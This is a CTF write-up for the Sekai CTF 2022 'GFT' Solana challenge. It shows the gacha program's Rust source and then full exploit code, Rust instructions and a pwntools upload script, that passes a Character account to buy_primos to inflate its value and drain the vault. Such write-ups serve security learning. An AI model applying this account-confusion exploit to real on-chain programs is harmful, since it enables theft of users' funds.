---
ctf_name: "Sekai CTF 2022"
layout: writeup
title:	"GFT"
date:	2022-10-2
category: "cryptobro"
author: "f1x3r" 
---

## The problem

In this challenge we get the source code of the program and the server and a Dockerfile to run the server locally.

The description of the challenge:

> Oh no! My blockchain gacha fungible tokens program has been impacted by some hacker! Can you steal my money back for me?

## Understanding the problem

### Server

The server listens on port 5000 for incoming connections, when a new connection is established `handle_connection` gets called.

`handle_connection` loads the challenge problem, create the user, adds the accounts with the respective lamports (2000 for us and 50000 to the vault), takes our solve as input and runs it, if after running our solve program we have more than 40000 lamports the flag gets sent to us.

```rust 
// base: https://github.com/otter-sec/sol-ctf-framework/tree/main/examples/moar-horse-5

use poc_framework_osec::{
    solana_sdk::signature::{Keypair, Signer},
    Environment, PrintableTransaction, setup_logging, LogLevel,

};

use sol_ctf_framework::ChallengeBuilder;

use solana_program::system_program;

use std::{
    error::Error,
    fs,
    io::Write,
    net::{TcpListener, TcpStream},
};

use threadpool::ThreadPool;

use gft::get_vault;

fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:5000")?;
    let pool = ThreadPool::new(4);
    for stream in listener.incoming() {
        let stream = stream.unwrap();

        pool.execute(|| {
            handle_connection(stream).unwrap();
        });
    }
    Ok(())
}

fn handle_connection(mut socket: TcpStream) -> Result<(), Box<dyn Error>> {
    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();

    // load programs
    let solve_pubkey = builder.input_program().unwrap();
    let program_pubkey = builder.chall_programs(&["./gft.so"])[0];

    // make user
    let user = Keypair::new();

    writeln!(socket, "program: {}", program_pubkey)?;
    writeln!(socket, "user: {}", user.pubkey())?;

    // add accounts and lamports
    let (vault, _) = get_vault(program_pubkey);

    // beeg money
    const TARGET_BAL: u64 = 40_000;
    const INIT_BAL: u64 = 2_000;
    const VAULT_BAL: u64 = 50_000;

    builder
        .builder
        .add_account_with_lamports(user.pubkey(), system_program::ID, INIT_BAL);
    builder
        .builder
        .add_account_with_lamports(vault, program_pubkey, VAULT_BAL);

    let mut challenge = builder.build();

    // run solve
    challenge.input_instruction(solve_pubkey, &[&user]).unwrap();

    // check solve
    let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;
    writeln!(socket, "lamports: {:?}", balance)?;

    if balance > TARGET_BAL {
        let flag = fs::read_to_string("flag.txt").unwrap();
        writeln!(socket, "your did it!\nFlag: {}", flag)?;
    }

    Ok(())
}
```

### Program

#### entrypoint.rs

When we call the challenge program the function `process_instruction` gets called with all the parameters forwarded.

```rust
entrypoint!(start);
fn start(program_id: &Pubkey, accounts: &[AccountInfo], instruction_data: &[u8]) -> ProgramResult {
    crate::processor::process_instruction(program_id, accounts, instruction_data)
}
```

#### lib.rs

In here there are some helper functions to create the invocations, other helpers to retrieve some data and the structs used in the challenge that can be serialized and deserialized with the `borsh` crate.

##### structs

```rust 
// used to specify the instruction we want to run
#[derive(BorshSerialize, BorshDeserialize)]
pub enum GachaInstruction {
    CreateUserAccount {
        account_name: String,
        account_bump: u8,
    },
    BuyPrimos {
        amount: u64,
        vault_bump: u8,
    },
    BuyCharacter {
        character_id: u8,
        character_bump: u8,
        vault_bump: u8,
    },
    SellAccount {
        vault_bump: u8,
    },
}

// used to store account data

#[derive(BorshSerialize, BorshDeserialize)]
pub struct UserAccount {
    pub primos: u64,
    pub characters: Vec<u8>,
    pub owner: Pubkey,
}

// used to store character data
#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub struct Character {
    pub stars: u64,
    pub name: String,
    pub id: u8,
    pub owner: Pubkey,
}
```

##### data retrieval helpers

```rust 
// retrieve useraccount pubkey and bump
pub fn get_useraccount(program: Pubkey, user: Pubkey, name: &str) -> (Pubkey, u8) {
    Pubkey::find_program_address(&[b"ACCOUNT", &user.to_bytes(), name.as_bytes()], &program)
}

// retrieve character pubkey and bump
pub fn get_character(program: Pubkey, useraccount: Pubkey, character_id: u8) -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[b"CHARACTER", &useraccount.to_bytes(), &[character_id]],
        &program,
    )
}

// retrieve vault pubkey and bump
pub fn get_vault(program: Pubkey) -> (Pubkey, u8) {
    Pubkey::find_program_address(&[b"VAULT"], &program)
}
```

##### invocation instruction helpers

```rust 
// create a `CreateUserAccount` instruction with the user pubkey and the `account_name`
pub fn create_useraccount(program: Pubkey, user: Pubkey, account_name: &str) -> Instruction {
    let (useraccount, useraccount_bump) = get_useraccount(program, user, &account_name);
    Instruction {
        program_id: program,
        accounts: vec![
            AccountMeta::new(useraccount, false),
            AccountMeta::new(user, true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: GachaInstruction::CreateUserAccount {
            account_name: account_name.to_string(),
            account_bump: useraccount_bump,
        }
        .try_to_vec()
        .unwrap(),
    }
}

// create a `BuyPrimos` instruction with the user pubkey, the `account_name` and the amount
pub fn buy_primos(program: Pubkey, user: Pubkey, account_name: &str, amount: u64) -> Instruction {
    let (useraccount, _) = get_useraccount(program, user, &account_name);
    let (vault, vault_bump) = get_vault(program);
    Instruction {
        program_id: program,
        accounts: vec![
            AccountMeta::new(useraccount, false),
            AccountMeta::new(user, true),
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: GachaInstruction::BuyPrimos { amount, vault_bump }
            .try_to_vec()
            .unwrap(),
    }
}

// create a `BuyCharacter` instruction with the user pubkey, the `account_name` and the `character_id`
pub fn buy_character(
    program: Pubkey,
    user: Pubkey,
    account_name: &str,
    character_id: u8,
) -> Instruction {
    let (useraccount, _) = get_useraccount(program, user, account_name);
    let (character, character_bump) = get_character(program, useraccount, character_id);
    let (vault, vault_bump) = get_vault(program);
    Instruction {
        program_id: program,
        accounts: vec![
            AccountMeta::new(useraccount, false),
            AccountMeta::new(user, true),
            AccountMeta::new(character, false),
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: GachaInstruction::BuyCharacter {
            character_id,
            character_bump,
            vault_bump,
        }
        .try_to_vec()
        .unwrap(),
    }
}

// create a `SellAccount` instruction with the user pubkey, the `account_name` and the `characters` array which contains a list of character id
pub fn sell_account(
    program: Pubkey,
    user: Pubkey,
    account_name: &str,
    characters: &[u8],
) -> Instruction {
    let (useraccount, _) = get_useraccount(program, user, account_name);
    let (vault, vault_bump) = get_vault(program);

    let mut accounts = vec![
        AccountMeta::new(useraccount, false),
        AccountMeta::new(user, true),
        AccountMeta::new(vault, false),
    ];

    for &c in characters {
        let (character, _) = get_character(program, useraccount, c);
        accounts.push(AccountMeta::new(character, false));
    }

    accounts.push(AccountMeta::new_readonly(system_program::id(), false));

    Instruction {
        program_id: program,
        accounts: accounts,
        data: GachaInstruction::SellAccount { vault_bump }
            .try_to_vec()
            .unwrap(),
    }
}
```

#### processor.rs

In here we have 5 main functions:

##### `process_instruction`
Takes the `instrucion_data` parameter, deserializes it in a `GachaInstruction` used to extract the parameters to call the right function.

The 4 `GachaInstruction`s are the following:
- `CreateUserAccount`, used to create a new user account to store `primos` (the challenge tokens) and the `characters` (the challenge NFTs);
- `BuyPrimos`, used to buy `primos` to any `UserAccount`;
- `BuyCharacter`, used to buy `characters` for an amount of `primos`;
- `SellAccount`, used to sell an `account` for `primos`.

```rust
pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    mut instruction_data: &[u8],
) -> ProgramResult {
    match GachaInstruction::deserialize(&mut instruction_data)? {
        GachaInstruction::CreateUserAccount {
            account_name,
            account_bump,
        } => create_useraccount(program_id, accounts, &account_name, account_bump),
        GachaInstruction::BuyPrimos { amount, vault_bump } => {
            buy_primos(program_id, accounts, amount, vault_bump)
        }
        GachaInstruction::BuyCharacter {
            character_id,
            character_bump,
            vault_bump,
        } => buy_character(
            program_id,
            accounts,
            character_id,
            character_bump,
            vault_bump,
        ),
        GachaInstruction::SellAccount { vault_bump } => {
            sell_account(program_id, accounts, vault_bump)
        }
    }
}
```

##### `create_useraccount`

Creates a new `UserAccount` with the given `account_name`, after checking that the accounts passed are the right ones.

```rust 
fn create_useraccount(
    program: &Pubkey,
    accounts: &[AccountInfo],
    account_name: &str,
    account_bump: u8,
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let useraccount_info = next_account_info(account_iter)?;
    let user_info = next_account_info(account_iter)?;

    let useraccount_address = Pubkey::create_program_address(
        &[
            b"ACCOUNT",
            &user_info.key.to_bytes(),
            &account_name.as_bytes(),
            &[account_bump],
        ],
        program,
    )?;

    assert_eq!(*useraccount_info.key, useraccount_address);
    assert!(useraccount_info.data_is_empty());
    assert!(user_info.is_signer);

    // probably good enough /shrug
    const ACCOUNT_SIZE: u64 = 512;

    invoke_signed(
        &system_instruction::create_account(
            user_info.key,
            useraccount_info.key,
            10,
            ACCOUNT_SIZE,
            program,
        ),
        &[user_info.clone(), useraccount_info.clone()],
        &[&[
            b"ACCOUNT",
            &user_info.key.to_bytes(),
            &account_name.as_bytes(),
            &[account_bump],
        ]],
    )?;

    let new_account = UserAccount {
        primos: 0,
        characters: Vec::new(),
        owner: *user_info.key,
    };

    new_account.serialize(&mut &mut useraccount_info.data.borrow_mut()[..])?;

    Ok(())
}
```

##### `buy_primos`

Uses lamports to buy `primos` and adds them to the `UserAccount` specified in the input parameters, after checking that the accounts passed are right, it only skips a check on the `user_info.owner` because we could potentially buy primos to accounts not owned by us.

```rust 
fn buy_primos(
    program: &Pubkey,
    accounts: &[AccountInfo],
    amount: u64,
    vault_bump: u8,
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let useraccount_info = next_account_info(account_iter)?;
    let user_info = next_account_info(account_iter)?;
    let vault_info = next_account_info(account_iter)?;
    let mut useraccount = UserAccount::deserialize(&mut &useraccount_info.data.borrow()[..])?;

    let vault_address = Pubkey::create_program_address(&[b"VAULT", &[vault_bump]], program)?;

    assert_eq!(*vault_info.key, vault_address);
    assert_eq!(useraccount_info.owner, program);
    assert_eq!(vault_info.owner, program);

    // no need to check account owner, since we can let users buy primos for each other
    assert!(user_info.is_signer);

    // 1:1 ratio between lamports:primos
    invoke(
        &system_instruction::transfer(user_info.key, vault_info.key, amount),
        &[user_info.clone(), vault_info.clone()],
    )?;

    useraccount.primos += amount;
    useraccount.serialize(&mut &mut useraccount_info.data.borrow_mut()[..])?;

    Ok(())
}
```

##### `buy_character`

Create a new account to contain the new `Character`, it's data is copied from the `CHARACTERS` array and, after checking that the character is not already present in the `UserAccount` and all the accounts passed are right, the `primos` are taken from the `UserAccount` and the new `character_id` gets pushed to the account's `characters` array.

```rust 
fn buy_character(
    program: &Pubkey,
    accounts: &[AccountInfo],
    character_id: u8,
    character_bump: u8,
    vault_bump: u8,
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let useraccount_info = next_account_info(account_iter)?;
    let user_info = next_account_info(account_iter)?;
    let character_info = next_account_info(account_iter)?;
    let vault_info = next_account_info(account_iter)?;
    let mut useraccount = UserAccount::deserialize(&mut &useraccount_info.data.borrow()[..])?;

    let character_address = Pubkey::create_program_address(
        &[
            b"CHARACTER",
            &useraccount_info.key.to_bytes(),
            &[character_id],
            &[character_bump],
        ],
        program,
    )?;

    msg!("{}", character_address);

    let vault_address = Pubkey::create_program_address(&[b"VAULT", &[vault_bump]], program)?;

    assert_eq!(*character_info.key, character_address);
    assert_eq!(*vault_info.key, vault_address);
    assert_eq!(useraccount_info.owner, program);
    assert_eq!(vault_info.owner, program);
    assert!(character_info.data_is_empty());

    assert!(user_info.is_signer);
    assert_eq!(useraccount.owner, *user_info.key);

    // prevent buying the same character twice
    for &c in &useraccount.characters {
        assert_ne!(character_id, c);
    }

    let stats = &CHARACTERS[character_id as usize];
    let character = Character {
        id: character_id,
        stars: stats.stars as u64,
        name: stats.name.to_string(),
        owner: *useraccount_info.key,
    };

    let price = (character.stars as u64) * BASE_PRICE;
    assert!(useraccount.primos >= price);

    // probably good enough /shrug
    const CHARACTER_SIZE: u64 = 128;

    invoke_signed(
        &system_instruction::create_account(
            user_info.key,
            character_info.key,
            10,
            CHARACTER_SIZE,
            program,
        ),
        &[user_info.clone(), character_info.clone()],
        &[&[
            b"CHARACTER",
            &useraccount_info.key.to_bytes(),
            &[character_id],
            &[character_bump],
        ]],
    )?;

    useraccount.primos -= price;
    useraccount.characters.push(character_id);

    useraccount.serialize(&mut &mut useraccount_info.data.borrow_mut()[..])?;
    character.serialize(&mut &mut character_info.data.borrow_mut()[..])?;

    Ok(())
}
```

##### `sell_account`

Sell the account containing the `Characters` and get lamports in exchange.
This function checks that the accounts passed are right and then character by character checks that the program that contains them are owned by the challenge program and that the `UserAccount` we passed owns the `Character`, checks that you didn't try to sell the same `Character` twice and then adds the value (`(character.stars as u64 * BASE_PRICE * LOSS_RATIO) / 100`) to the total. We then receive the total amount of the sale in lamports.

```rust 
// monkaTOS
fn sell_account(program: &Pubkey, accounts: &[AccountInfo], vault_bump: u8) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let useraccount_info = next_account_info(account_iter)?;
    let user_info = next_account_info(account_iter)?;
    let vault_info = next_account_info(account_iter)?;

    // further accounts passed are all the characters that the user owns

    let mut useraccount = UserAccount::deserialize(&mut &useraccount_info.data.borrow()[..])?;

    let vault_address = Pubkey::create_program_address(&[b"VAULT", &[vault_bump]], program)?;

    assert_eq!(*vault_info.key, vault_address);
    assert_eq!(useraccount_info.owner, program);
    assert_eq!(vault_info.owner, program);

    assert!(user_info.is_signer);
    assert_eq!(useraccount.owner, *user_info.key);

    let mut price = 0;
    let mut sold = HashSet::new();
    for character_info in account_iter.take(useraccount.characters.len()) {
        let character = Character::deserialize(&mut &character_info.data.borrow()[..])?;

        assert_eq!(character_info.owner, program);
        assert_eq!(character.owner, *useraccount_info.key);

        // haha nice try
        assert!(!sold.contains(&character.id));

        price += (character.stars as u64 * BASE_PRICE * LOSS_RATIO) / 100;
        sold.insert(character.id);
    }

    **vault_info.lamports.borrow_mut() -= price;
    **user_info.lamports.borrow_mut() += price;

    useraccount.owner = *program;
    useraccount.serialize(&mut &mut useraccount_info.data.borrow_mut()[..])?;

    Ok(())
}
```


## Exploitation

After seeing that the `buy_primos` functions takes a `UserAccount` but does not check the owner of the account and that it only modifies the `primos` field we can assume that by just giving it a similar enought structure we can write the field that is placed at the same offset of `primos`, like the `stars` field in `Character`.

So by passing to `buy_primos` function a `Character` and an `amount` big enough to steal enough lamports, we can see that the `stars` field gets increased of `amount`, so we can use that function to increase the value of a character that we can then sell to get `character.stars as u64 * BASE_PRICE * LOSS_RATIO) / 100` lamports.

### Exploit sequence

#### Setup all the variables
```rust
let account_iter = &mut accounts.iter();
let user = next_account_info(account_iter)?;
let gft = next_account_info(account_iter)?;
let character_info = next_account_info(account_iter)?;
let useraccount = next_account_info(account_iter)?;
let vault = next_account_info(account_iter)?;
let sys = next_account_info(account_iter)?;

let vault_bump = instruction_data[0];

let character_id = 0;
let account_name = "f1x3r";
```


#### Create an account
```rust
let _ = invoke(
    &create_useraccount(*gft.key, *user.key, account_name),
    &[useraccount.clone(), user.clone(), _sys.clone()],
);
```

#### Buy enough `primos` to buy a `Character`, e.g. 800
```rust
let _ = invoke(
    &buy_primos(*gft.key, *user.key, account_name, 800),
    &[
        useraccount.clone(),
        user.clone(),
        vault.clone(),
        sys.clone(),
    ],
);

```
#### Buy a character
```rust
let _ = invoke(
    &buy_character(*gft.key, *user.key, account_name, character_id),
    &[
        useraccount.clone(),
        user.clone(),
        character_info.clone(),
        vault.clone(),
        sys.clone(),
    ],
);
```
#### Call enough `buy_primos` with the `Character` we just bought in place of an `Account`, e.g. 303 (to empty the vault)
```rust
// the amount of stars to add to our character
let amount = 303;

// create the instruction
let exp = Instruction {
    program_id: *gft.key,
    accounts: vec![
        AccountMeta::new(*character_info.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new(*vault.key, false),
        AccountMeta::new_readonly(system_program::id(), false),
    ],
    data: GachaInstruction::BuyPrimos { amount, vault_bump }
        .try_to_vec()
        .unwrap(),
};

// invoke the instruction
let _ = invoke(
    &exp,
    &[
        character_info.clone(),
        user.clone(),
        vault.clone(),
        sys.clone(),
    ],
);
```
#### Sell the account with the forged `Character`
```rust
let _ = invoke(
    &sell_account(*gft.key, *user.key, account_name, &[character_id]),
    &[
        useraccount.clone(),
        user.clone(),
        vault.clone(),
        character_info.clone(),
        sys.clone(),
    ],
);
```
#### Profit


### python script to send our program to the server

We have to connect to the server, send our compiled program size and our program and then retrieve the challenge program and user program pubkey, we can then send our accounts and data to call our program's entrypoint

```python 
from pwn import *
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or "localhost"
port = int(args.PORT or 5000)
solve_so = "solve.so"

io = connect(host, port)

# read our program from file
with open(solve_so, "rb") as f:
    solve_so_data = f.read()

# send program's size to server
io.sendlineafter(b"len", str(len(solve_so_data)).encode("ascii"))
# send program to server
io.send(solve_so_data)

# receive challenge program pubkey
io.recvuntil(b"program: ").decode("ascii")
program = PublicKey(io.recvline().strip().decode())
log.info(f"program: {program}")

# receive user pubkey
io.recvuntil(b"user: ").decode("ascii")
user = PublicKey(io.recvline().strip().decode("ascii"))
log.info(f"user: {user}")

# find useraccount pubkey and bump
useraccount, useraccount_bump = PublicKey.find_program_address(
    [
        b"ACCOUNT",
        bytes(PublicKey(user)),
        b"f1x3r",
    ],
    program,
)
log.info(f"useraccount: {useraccount}")

# find character pubkey and bump
character, character_bump = PublicKey.find_program_address(
    [
        b"CHARACTER",
        bytes(useraccount),
        int(0).to_bytes(1, "little")
    ],
    program,
)
log.info(f"character: {character}")

# find vault pubkey and bump
vault, vault_bump = PublicKey.find_program_address([b"VAULT"], program)
log.info(f"vault: {vault}")

# put together the accounts array, each account can be `signer`(`s`), `writable`(`w`), both(`ws`) or none(`q` or any other char, not `s` or `w`, for that matter) of them and that is specified by the first field of the tuple
accounts = [
    (b"ws", user.to_base58()),
    (b"q", program.to_base58()),
    (b"w", character.to_base58()),
    (b"w", useraccount.to_base58()),
    (b"w", vault.to_base58()),
    (b"q", SYS_PROGRAM_ID.to_base58()),
]

# encode our data (here we only need the vault bump)
ix_data = p8(vault_bump)

io.recvuntil(b"num accounts:").decode("ascii")
# send the number of accounts and the accounts
io.sendline(str(len(accounts)).encode("ascii"))
for access, key in accounts:
    io.sendline(access + b" " + key)

io.recvuntil(b"ix len:").decode("ascii")
# send data size and data
io.sendline(str(len(ix_data)).encode("ascii"))
io.send(ix_data)

# wait for any answer from the server and log it
output = printable(io.recvall()).decode("utf-8")
log.info(output)
```


### run the exploit

1. Build the program with `cargo build-bpf`
2. Run the solve script:
    - run `python solve.py` to run it on a local instance of the server
    - run `python solve.py HOST=<server_addr> PORT=<server_port>` to run it against the real server

The output should look something like this:

```
[+] Opening connection to localhost on port 5000: Done
[*] program: FrMQd67gsyEre7sdoY3SC6sPe3cBq3yHEkpVb9VRTxyo
[*] user: 4CXtoTXu7QLysLSEobV5S4fFg3rV6fhgb3NV6gKbrKLG
[*] useraccount: C1TUKbrBD2xUA3kzQCanB9uMFzEMS4AWjKGcNAqngcmy
[*] character: Gu5KLAKoSjLNb9wFtoE8TaB5DwQoUjNgZQCNm5BMXvJ6
[*] vault: EPpZENNT5qpowQvBDGmvZkPAyCKu4zx3PUwneybkGw1e
[+] Receiving all data: Done (55B)
[*] Closed connection to localhost port 5000
[*]
    lamports: 49997
    your did it!
    Flag: SEKAI{test_flag}
```

For all the files check out the [github repo](https://github.com/barsa2000/sekai2022_gft)

## To learn more abount solana

- [solana cookbook](https://solanacookbook.com) - Essential concepts
- [solana sdk for rust](https://docs.rs/solana-sdk/latest/solana_sdk/)
- [Developement docs](https://docs.solana.com/developers)
- [neodyme workshop](https://workshop.neodyme.io/index.html) - A security workshop to start learning different types of issues